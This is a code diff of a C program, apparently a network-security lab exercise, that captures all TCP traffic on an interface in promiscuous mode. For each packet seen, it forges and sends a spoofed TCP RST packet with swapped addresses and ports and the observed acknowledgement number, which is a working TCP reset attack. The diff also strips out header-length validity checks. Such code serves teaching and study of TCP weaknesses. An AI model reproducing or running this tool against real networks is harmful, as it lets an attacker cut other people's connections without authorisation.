@@ -13,60 +13,59 @@
 #include <arpa/inet.h>
 #include <time.h>
 
-#define TCP_DATA   "Hello rishov here"
-/* maximum bytes per packet to capture */
-#define MAX_BUF_TO_CAPTURE 1518
-
-#define PACKET_LEN 8192
+#define TCP_DATA "Hello rishov here"
 
 /* Ethernet addresses are 6 bytes */
 #define ETHERNET_ADDRESS_LEN 6
 
 /* Ethernet header */
 // ethernet header length 14
-struct Ethernet_Header {
-    u_char  ethernet_dest_host[ETHERNET_ADDRESS_LEN];    // destination host address , 6 bytes = 48 bits, mac address
-    u_char  ethernet_source_host[ETHERNET_ADDRESS_LEN];  // source host address
-    u_short ethernet_type;                               // IP? ARP? RARP? etc
+struct Ethernet_Header
+{
+    u_char ethernet_dest_host[ETHERNET_ADDRESS_LEN];   // destination host address , 6 bytes = 48 bits, mac address
+    u_char ethernet_source_host[ETHERNET_ADDRESS_LEN]; // source host address
+    u_short ethernet_type;                             // IP? ARP? RARP? etc
 };
 
 // IP Header
-struct IP_Header {
-    unsigned char      iph_ih_len:4,            //IP header length
-    iph_version:4;                              //IP version
-    unsigned char      iph_tos;                 //Type of service
-    unsigned short int iph_len;                 //IP Packet length (data + header)
-    unsigned short int iph_identification;      //Identification
-    unsigned short int iph_flag:3,              //Fragmentation flags
-    iph_offset:13;                              //Flags offset
-    unsigned char      iph_ttl;                 //Time to Live
-    unsigned char      iph_protocol;            //Protocol type
-    unsigned short int iph_checksum;            //IP datagram checksum
-    struct  in_addr    iph_source_ip;           //Source IP address
-    struct  in_addr    iph_destination_ip;      //Destination IP address
+struct IP_Header
+{
+    unsigned char iph_ih_len : 4,          //IP header length
+        iph_version : 4;                   //IP version
+    unsigned char iph_tos;                 //Type of service
+    unsigned short int iph_len;            //IP Packet length (data + header)
+    unsigned short int iph_identification; //Identification
+    unsigned short int iph_flag : 3,       //Fragmentation flags
+        iph_offset : 13;                   //Flags offset
+    unsigned char iph_ttl;                 //Time to Live
+    unsigned char iph_protocol;            //Protocol type
+    unsigned short int iph_checksum;       //IP datagram checksum
+    struct in_addr iph_source_ip;          //Source IP address
+    struct in_addr iph_destination_ip;     //Destination IP address
 };
 
 /* TCP Header */
-struct TCP_Header {
-    u_short tcp_source_port;                    /* source port */
-    u_short tcp_destination_port;               /* destination port */
-    u_int   tcp_sequence_num;                   /* sequence number */
-    u_int   tcp_ack_num;                        /* acknowledgement number */
-    u_char  tcp_offx2;                          /* data offset, rsvd */
+struct TCP_Header
+{
+    u_short tcp_source_port;      /* source port */
+    u_short tcp_destination_port; /* destination port */
+    u_int tcp_sequence_num;       /* sequence number */
+    u_int tcp_ack_num;            /* acknowledgement number */
+    u_char tcp_offx2;             /* data offset, rsvd */
 #define TH_OFF(th) (((th)->tcp_offx2 & 0xf0) >> 4)
-    u_char  tcp_flags;
-#define TH_FIN  0x01
-#define TH_SYN  0x02
-#define TH_RST  0x04
+    u_char tcp_flags;
+#define TH_FIN 0x01
+#define TH_SYN 0x02
+#define TH_RST 0x04
 #define TH_PUSH 0x08
-#define TH_ACK  0x10
-#define TH_URG  0x20
-#define TH_ECE  0x40
-#define TH_CWR  0x80
-#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
-    u_short tcp_win;                        /* window */
-    u_short tcp_sum;                        /* checksum */
-    u_short tcp_urp;                        /* urgent pointer */
+#define TH_ACK 0x10
+#define TH_URG 0x20
+#define TH_ECE 0x40
+#define TH_CWR 0x80
+#define TH_FLAGS (TH_FIN | TH_SYN | TH_RST | TH_ACK | TH_URG | TH_ECE | TH_CWR)
+    u_short tcp_win; /* window */
+    u_short tcp_sum; /* checksum */
+    u_short tcp_urp; /* urgent pointer */
 };
 
 /* Psuedo TCP header */
@@ -80,39 +79,40 @@ struct pseudo_TCP_Header
     char payload[1500];
 };
 
-
-unsigned short in_checksum (unsigned short *buf, int length)
+unsigned short in_checksum(unsigned short *buf, int length)
 {
     unsigned short *w = buf;
     int nleft = length;
     int sum = 0;
-    unsigned short temp=0;
+    unsigned short temp = 0;
 
     /*
      * The algorithm uses a 32 bit accumulator (sum), adds
      * sequential 16 bit words to it, and at the end, folds back all
      * the carry bits from the top 16 bits into the lower 16 bits.
      */
-    while (nleft > 1)  {
+    while (nleft > 1)
+    {
         sum += *w++;
         nleft -= 2;
     }
 
     /* treat the odd byte at the end, if any */
-    if (nleft == 1) {
-        *(u_char *)(&temp) = *(u_char *)w ;
+    if (nleft == 1)
+    {
+        *(u_char *)(&temp) = *(u_char *)w;
         sum += temp;
     }
 
     /* add back carry outs from top 16 bits to low 16 bits */
-    sum = (sum >> 16) + (sum & 0xffff);  // add high 16 to low 16
-    sum += (sum >> 16);                  // add carry
+    sum = (sum >> 16) + (sum & 0xffff); // add high 16 to low 16
+    sum += (sum >> 16);                 // add carry
     return (unsigned short)(~sum);
 }
 
 unsigned short calculate_tcp_checksum(struct IP_Header *ip)
 {
-    struct TCP_Header *tcp = (struct TCP_Header *)((u_char *)ip + sizeof(struct IP_Header ));
+    struct TCP_Header *tcp = (struct TCP_Header *)((u_char *)ip + sizeof(struct IP_Header));
 
     int tcp_len = ntohs(ip->iph_len) - sizeof(struct IP_Header);
 
@@ -120,14 +120,14 @@ unsigned short calculate_tcp_checksum(struct IP_Header *ip)
     struct pseudo_TCP_Header p_tcp;
     memset(&p_tcp, 0x0, sizeof(struct pseudo_TCP_Header));
 
-    p_tcp.source_addr   = ip->iph_source_ip.s_addr;
-    p_tcp.dest_addr     = ip->iph_destination_ip.s_addr;
-    p_tcp.mbz           = 0;
-    p_tcp.protocol      = IPPROTO_TCP;
-    p_tcp.tcp_len       = htons(tcp_len); //The htons function can be used to convert an IP port number in host byte order to the IP port number in network byte order
+    p_tcp.source_addr = ip->iph_source_ip.s_addr;
+    p_tcp.dest_addr = ip->iph_destination_ip.s_addr;
+    p_tcp.mbz = 0;
+    p_tcp.protocol = IPPROTO_TCP;
+    p_tcp.tcp_len = htons(tcp_len); //The htons function can be used to convert an IP port number in host byte order to the IP port number in network byte order
     memcpy(&p_tcp.tcp, tcp, tcp_len);
 
-    return  (unsigned short) in_checksum((unsigned short *)&p_tcp, tcp_len + 12);
+    return (unsigned short)in_checksum((unsigned short *)&p_tcp, tcp_len + 12);
 }
 /**
  *
@@ -174,8 +174,7 @@ unsigned short calculate_tcp_checksum(struct IP_Header *ip)
      * Edit the payload means that you are free to put what you want directly in the IP payload.
      */
 
-
-void send_raw_ip_packet(struct IP_Header* ip)
+void send_raw_ip_packet(struct IP_Header *ip)
 {
     /**
      * Step 1: Creating a raw socket
@@ -193,7 +192,7 @@ void send_raw_ip_packet(struct IP_Header* ip)
      */
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 
-    if(sock < 1)
+    if (sock < 1)
     {
         printf("raw socket creation failed at send_raw_ip_packet");
         exit(-1);
@@ -225,8 +224,8 @@ void send_raw_ip_packet(struct IP_Header* ip)
      * (failing to set this field may cause problems).
      */
     struct sockaddr_in destination_info;
-    destination_info.sin_family    = AF_INET;
-    destination_info.sin_addr      = ip->iph_destination_ip;
+    destination_info.sin_family = AF_INET;
+    destination_info.sin_addr = ip->iph_destination_ip;
 
     /**
      * Step 4: Sending out the spoofed packet.
@@ -249,7 +248,7 @@ void send_raw_ip_packet(struct IP_Header* ip)
      */
     int send_packet_check = sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&destination_info, sizeof(destination_info));
 
-    if(send_packet_check < 0)
+    if (send_packet_check < 0)
     {
         printf("Sending packet failed");
         exit(-1);
@@ -258,10 +257,11 @@ void send_raw_ip_packet(struct IP_Header* ip)
     close(sock);
 }
 
-void spoof_RST_packet(u_short source_port, u_short destination_port, struct in_addr source_ip, struct in_addr destination_ip, u_int seq){
+void spoof_RST_packet(struct in_addr source_ip, struct in_addr destination_ip, u_short source_port, u_short destination_port, u_int sequence_number)
+{
     // No data, just datagram
-    char buffer[PACKET_LEN];
-    memset(buffer, 0, PACKET_LEN);
+    char buffer[4096];
+    memset(buffer, 0, 4096);
 
     /* if we want to send data
     char *data = buffer + sizeof(struct IP_Header) + sizeof(struct TCP_Header);
@@ -271,32 +271,30 @@ void spoof_RST_packet(u_short source_port, u_short destination_port, struct in_a
     */
 
     // The size of the headers
-    struct IP_Header *ip = (struct IP_Header *) buffer;
-    struct TCP_Header *tcp = (struct TCP_Header *) (buffer + sizeof(struct IP_Header));
+    struct IP_Header *ip = (struct IP_Header *)buffer;
+    struct TCP_Header *tcp = (struct TCP_Header *)(buffer + sizeof(struct IP_Header));
 
     /*********************************************************
     Step 1: Fill in the TCP header.
     ********************************************************/
-    tcp->tcp_source_port        = htons(source_port);
-    tcp->tcp_destination_port   = htons(destination_port);
-    tcp->tcp_sequence_num       = htonl(seq);
-    tcp->tcp_offx2              = 0x50;
-    //tcp->tcp_flags              = 0x000;
-    //tcp->tcp_flags              = tcp->tcp_flags | 0x040;
-    tcp->tcp_flags              = 0x04;//may have to change
-    tcp->tcp_win                = htons(16384);
-    tcp->tcp_sum                = 0; //will be calculated later
+    tcp->tcp_source_port = htons(source_port);
+    tcp->tcp_destination_port = htons(destination_port);
+    tcp->tcp_sequence_num = htonl(sequence_number);
+    tcp->tcp_offx2 = 0x50;
+    tcp->tcp_flags = 0x04;
+    tcp->tcp_win = htons(8192);
+    tcp->tcp_sum = 0; //will be calculated later
 
     /*********************************************************
     Step 2: Fill in the IP header.
     ********************************************************/
-    ip->iph_version                 = 4;                        // Version (IPv4)
-    ip->iph_ih_len                  = 5;                        // Header length
-    ip->iph_ttl                     = 20;                       // Time to live
-    ip->iph_source_ip.s_addr        = source_ip.s_addr;         // Source IP
-    ip->iph_destination_ip.s_addr   = destination_ip.s_addr;    // Destination IP
-    ip->iph_protocol                = IPPROTO_TCP;              // The value is 6.
-    ip->iph_len                     = htons(sizeof(struct IP_Header) + sizeof(struct TCP_Header));
+    ip->iph_version = 4;                                   // Version (IPv4)
+    ip->iph_ih_len = 5;                                    // Header length
+    ip->iph_ttl = 20;                                      // Time to live
+    ip->iph_source_ip.s_addr = source_ip.s_addr;           // Source IP
+    ip->iph_destination_ip.s_addr = destination_ip.s_addr; // Destination IP
+    ip->iph_protocol = IPPROTO_TCP;                        // The value is 6.
+    ip->iph_len = htons(sizeof(struct IP_Header) + sizeof(struct TCP_Header));
     //ip->iph_len                     = htons(sizeof(struct IP_Header) + sizeof(struct TCP_Header) + message_len);
 
     /*********************************************************
@@ -316,93 +314,72 @@ void spoof_RST_packet(u_short source_port, u_short destination_port, struct in_a
     send_raw_ip_packet(ip);
 }
 
-void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
+void my_packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 {
-    static int count = 1;                   /* packet counter */
+    static int count = 1; /* packet counter */
     /* declare pointers to packet headers */
-    const struct Ethernet_Header *ethernet;  /* The ethernet header [1] */
-    const struct IP_Header *ip;              /* The IP header */
-    const struct TCP_Header *tcp;            /* The TCP header */
+    const struct Ethernet_Header *ethernet; /* The ethernet header [1] */
+    const struct IP_Header *ip;             /* The IP header */
+    const struct TCP_Header *tcp;           /* The TCP header */
 
     //printf("************Packet number %d:\n", count);
     count++;
 
     // define ethernet header
-    ethernet = (struct Ethernet_Header*)(packet);
+    ethernet = (struct Ethernet_Header *)(packet);
 
-    if(ntohs(ethernet->ethernet_type) != ETHERTYPE_IP)
+    if (ntohs(ethernet->ethernet_type) != ETHERTYPE_IP)
     {
         //printf("\nNot an IP packet...skipping.\n");
         return;
     }
     // compute ip header offset
-    ip = (struct IP_Header*)(packet + sizeof(struct Ethernet_Header));
-    int ip_header_len = (ip -> iph_ih_len) * 4;
-
-    //printf("\nIP header length: %u bytes\n", ip_header_len);
-
-    if (ip_header_len < 20)
-    {
-        printf("\nInvalid IP header length: %u bytes\n", ip_header_len);
-        return;
-    }
+    ip = (struct IP_Header *)(packet + sizeof(struct Ethernet_Header));
+    int ip_header_len = (ip->iph_ih_len) * 4;
 
     // print source and destination IP addresses
     //printf("       From: %s     (Source IP address)\n", inet_ntoa(ip->iph_source_ip));
     //printf("         To: %s     (Destination IP address)\n", inet_ntoa(ip->iph_destination_ip));
 
     // determine protocol
-    switch(ip->iph_protocol) {
-        case IPPROTO_TCP:
-            //printf("   Protocol: TCP...continue ahead\n");
-            break;
-        case IPPROTO_IP:
-            printf("   Protocol: IP...skipping\n");
-            return;
-        case IPPROTO_UDP:
-            printf("   Protocol: UDP...skipping\n");
-            return;
-        case IPPROTO_ICMP:
-            printf("   Protocol: ICMP...skipping\n");
-            return;
-        default:
-            printf("   Protocol: others...skipping\n");
-            return;
-    }
-
-    // compute tcp header offset
-    tcp = (struct TCP_Header*)(packet + sizeof(struct Ethernet_Header) + ip_header_len);
-    int tcp_header_len = TH_OFF(tcp) * 4;
-
-    //printf("\nTCP header length: %u bytes\n", tcp_header_len);
-    if (tcp_header_len < 20)
+    switch (ip->iph_protocol)
     {
-        printf("\nInvalid TCP header length: %u bytes\n", tcp_header_len);
+    case IPPROTO_TCP:
+        break;
+    case IPPROTO_IP:
+        return;
+    case IPPROTO_UDP:
+        return;
+    case IPPROTO_ICMP:
+        return;
+    default:
         return;
     }
 
-    //spoof_RST_packet(ntohs(tcp -> tcp_source_port), ntohs(tcp -> tcp_destination_port), ip -> iph_source_ip, ip -> iph_destination_ip, ntohl(tcp -> tcp_sequence_num) + 1 );
-    spoof_RST_packet(ntohs(tcp -> tcp_destination_port), ntohs(tcp -> tcp_source_port), ip -> iph_destination_ip, ip -> iph_source_ip, ntohl(tcp -> tcp_ack_num));
+    // compute tcp header offset
+    tcp = (struct TCP_Header *)(packet + sizeof(struct Ethernet_Header) + ip_header_len);
+    int tcp_header_len = TH_OFF(tcp) * 4;
+
+    spoof_RST_packet(ip->iph_destination_ip, ip->iph_source_ip, ntohs(tcp->tcp_destination_port), ntohs(tcp->tcp_source_port), ntohl(tcp->tcp_ack_num));
 
     return;
 }
 
 int main(int argc, char **argv)
 {
-    char *device = NULL;			            // capture device name
-    char error_buffer[PCAP_ERRBUF_SIZE];		// error buffer
-    pcap_t *handle;				                // packet capture handle
-    char filter_exp[] = "tcp";		            // filter expression [3]
-    struct bpf_program filter;			        // compiled filter program (expression)
-    bpf_u_int32 subnet_mask;			        // subnet mask
-    bpf_u_int32 net;			                // ip
-    int num_packets = 0;			            // number of packets to capture
+    char *device = NULL;                 // capture device name
+    char error_buffer[PCAP_ERRBUF_SIZE]; // error buffer
+    pcap_t *handle;                      // packet capture handle
+    char filter_exp[] = "tcp";           // filter expression [3]
+    struct bpf_program filter;           // compiled filter program (expression)
+    bpf_u_int32 subnet_mask;             // subnet mask
+    bpf_u_int32 net;                     // ip
+    int number_of_packets = 0;           // number of packets to capture
 
     /* find a capture device if not specified on command-line */
     device = pcap_lookupdev(error_buffer);
 
     //printf("Device: %s\n", device);
-
 
     if (device == NULL)
     {
@@ -419,15 +396,16 @@ int main(int argc, char **argv)
     }
 
     /* print capture info */
-    printf("Device: %s\n", device);
-    printf("Number of packets: %d\n", num_packets);
     printf("Filter expression: %s\n", filter_exp);
+    printf("Device(Interface): %s\n", device);
+    printf("Number of packets: %d\n", number_of_packets);
 
     /* open device for live capture */
     //pcap_t *pcap_open_live(const char *device, int snaplen, int promiscuous_mode, int to_ms, char *error_buffer);
-    int packet_buffer_timeout = 1000;//in miliseconds
-    int promiscuous_mode = 1; // non zero means enabled
-    handle = pcap_open_live(device, MAX_BUF_TO_CAPTURE, promiscuous_mode, packet_buffer_timeout, error_buffer);
+    int packet_buffer_timeout = 1000; //in miliseconds
+    int promiscuous_mode = 1;         // non zero means enabled
+    int max_buf_to_capture = 768;
+    handle = pcap_open_live(device, max_buf_to_capture, promiscuous_mode, packet_buffer_timeout, error_buffer);
     if (handle == NULL)
     {
         fprintf(stderr, "Couldn't open device %s: %s\n", device, error_buffer);
@@ -435,12 +413,12 @@ int main(int argc, char **argv)
     }
 
     /* make sure we're capturing on an Ethernet device [2] */
-//    if (pcap_datalink(handle) != DLT_EN10MB)
-//    {
-//        fprintf(stderr, "%s is not an Ethernet\n", device);
-//        printf("%s is not an Ethernet\n", device);
-//        exit(EXIT_FAILURE);
-//    }
+    //    if (pcap_datalink(handle) != DLT_EN10MB)
+    //    {
+    //        fprintf(stderr, "%s is not an Ethernet\n", device);
+    //        printf("%s is not an Ethernet\n", device);
+    //        exit(EXIT_FAILURE);
+    //    }
 
     /* compile the filter expression */
     if (pcap_compile(handle, &filter, filter_exp, 0, net) == -1)
@@ -457,9 +435,9 @@ int main(int argc, char **argv)
     }
 
     /* now we can set our callback function */
-    // A value of -1 or 0 for num_packets is equivalent to infinity,
+    // A value of -1 or 0 for number_of_packets is equivalent to infinity,
     // so that packets are processed until another ending condition occurs.
-    pcap_loop(handle, num_packets, got_packet, NULL);
+    pcap_loop(handle, number_of_packets, my_packet_handler, NULL);
 
     /* cleanup */
     pcap_freecode(&filter);
